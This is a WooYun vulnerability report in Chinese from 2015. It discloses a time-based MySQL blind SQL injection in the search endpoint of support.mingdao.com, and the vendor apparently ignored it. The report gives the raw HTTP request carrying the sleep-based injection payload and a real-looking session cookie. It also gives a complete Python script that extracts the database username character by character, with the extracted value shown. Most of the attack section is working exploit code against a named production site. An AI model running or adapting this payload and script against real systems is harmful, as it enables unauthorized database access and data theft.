wybug_title: 明道某站点MySQL盲注(附验证脚本)
wybug_corp: 上海万企明道软件有限公司
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-06-16：	细节已通知厂商并且等待厂商处理中									2015-06-19：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 明道某站点MySQL盲注(附验证脚本) 详细说明：  注入点：
GET /posts/search?keyword=aaa'XOR(sleep(ascii(mid(user()from(2)for(1)))>101))OR'bb HTTP/1.1Referer: http://support.mingdao.comCookie: PHPSESSID=k9ctvvsqkn4llkthmv5joq5p40; mobile=2Host: support.mingdao.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4Accept: */*
   漏洞证明：  
[Done] MySQL user is kf5@10.10.6.28



#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {'Cookie': 'PHPSESSID=k9ctvvsqkn4llkthmv5joq5p40; mobile=2',           'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4',           'Referer': 'http://support.mingdao.com'}payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'print '[%s] Start to retrive MySQL User:' % time.strftime('%H:%M:%S', time.localtime())user = ''for i in range(1, 21):    for payload in payloads:        timed_out = 0        for j in range(2):            try:                s = "/posts/search?keyword=aaa'XOR(sleep(ascii(mid(user()from(%s)for(1)))=%s))OR'bb" % (i, ord(payload))                conn = httplib.HTTPConnection('support.mingdao.com', timeout=1)                conn.request(method='GET',url=s, headers=headers)                conn.getresponse().read()                conn.close()                print '.',                break            except:                timed_out += 1        if timed_out == 2:            user += payload            print '\n[in progress]', user,            time.sleep(1.0)            break        print '\n[Done] MySQL user is %s' % user
   修复方案：  参数过滤下   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-19 13:17 厂商回复： 第三方漏洞，已修复 最新状态： 暂无
